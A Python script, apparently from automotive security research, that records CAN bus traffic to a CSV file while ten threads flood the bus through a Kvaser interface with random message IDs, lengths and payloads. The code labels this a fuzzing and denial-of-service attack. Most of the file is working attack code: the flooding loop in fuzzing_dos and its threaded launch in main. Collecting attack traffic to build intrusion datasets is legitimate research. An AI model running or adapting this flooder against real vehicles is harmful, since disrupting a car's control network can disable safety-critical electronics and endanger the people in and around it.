############################################
# Written by: chanyoung Kim
# Comment by: chanyoung Kim
# Written date: 2024-09-29
# Update date: 2025-04-20
############################################

import can
import threading
import random
import time
from datetime import datetime
import pandas as pd
import pickle
from canlib import canlib

# 읽은 CAN 메시지를 저장하는 dict
data = {
    'id': [],
    'dlc': [],
    'data': [],
    'Timestamp': []
}

# 현재 시간정보 가져오는 함수
def timestamp():
    now = datetime.now()
    nt = now.strftime('%Y.%m.%d.%H:%M:%S.%f')
    return nt

# 파일 이름 저장 함수
def file_name():
    user_name = input("사용자 이름을 입력하세요 : ")

    now = datetime.now()
    nt = now.strftime('%Y_%m_%d %Hh %Mm %Ss ')
    save_str = "./" + nt + "CAN Message[" + user_name + "].csv"

    print("file_name : " + save_str)
    return save_str

# 데이터 전처리 함수
def normalization_data(data):
    data = str(data.hex()).upper()
    split_two = []
    for i in range(0, len(data), 2):
        split_two.append(data[i:i+2])
    split_two.reverse()
    data = ' '.join(split_two)
    return data

# CAN 메시지를 수집하는 함수
def can_message_listener():
    save_str = file_name()

    print("##### Extracting CAN DATA #####")

    ch = canlib.openChannel(channel=0, bitrate=canlib.Bitrate.BITRATE_500K)
    ch.busOn()
    
    try:
        while True:
            frame = ch.read(timeout=int(3 * 1000))

            if frame is None:
                continue

            if str(hex(int(frame.id))[2:]).upper() == "7DF":
                continue

            data['id'].append(str(hex(int(frame.id))[2:]).upper())
            data['dlc'].append(frame.dlc)
            data['data'].append(normalization_data(frame.data))
            data['Timestamp'].append(timestamp())

    except KeyboardInterrupt:
        print("System Shutdown...\n# BUS OFF")
        ch.busOff()
        return

    except canlib.canError as e:
        print(f"CAN error: {e}")

    # 데이터 저장
    csv_data = pd.DataFrame(data, columns=['id', 'dlc', 'data', "Timestamp"])
    csv_data.to_csv(save_str)
    print("데이터가 저장되었습니다.")


# Fuzzing 공격을 수행하는 함수
def fuzzing_dos(number):
    while True:
        # CAN ID Fuzzing
        CAN_ID = random.randrange(0, 0x7FF)
        # CAN DLC Fuzzing
        CAN_DLC = random.randrange(1, 8)
        # CAN DATA Fuzzing / DATA는 DLC에 맞춰서 랜덤한 값을 주입
        CAN_DATA = bytearray(random.getrandbits(8) for _ in range(CAN_DLC))

        print(f"Thread Number: {number}")

        # Send a CAN message
        with can.Bus(channel=0, interface="kvaser", bitrate=500000) as bus:
            msg = can.Message(
                arbitration_id=CAN_ID,
                data=CAN_DATA,
                is_extended_id=False
            )

            try:
                bus.send(msg)
            except can.CanError:
                print("Message NOT sent")
            except KeyboardInterrupt:
                print("Abort DoS_Fuzzing Attack")
                exit(1)


# Define and run threads for both Fuzzing and CAN message listener
def main():
    # 메시지 수집 쓰레드
    listener_thread = threading.Thread(target=can_message_listener)

    # Fuzzing 공격 쓰레드들
    fuzzing_threads = []
    for i in range(10):
        t = threading.Thread(target=fuzzing_dos, args=(i,))
        fuzzing_threads.append(t)

    # 메시지 수집 쓰레드 실행
    listener_thread.start()

    # Fuzzing 공격 쓰레드 실행
    for t in fuzzing_threads:
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Terminating all threads...")

        # 모든 쓰레드 종료
        listener_thread.join()
        for t in fuzzing_threads:
            t.join()


if __name__ == "__main__":
    main()
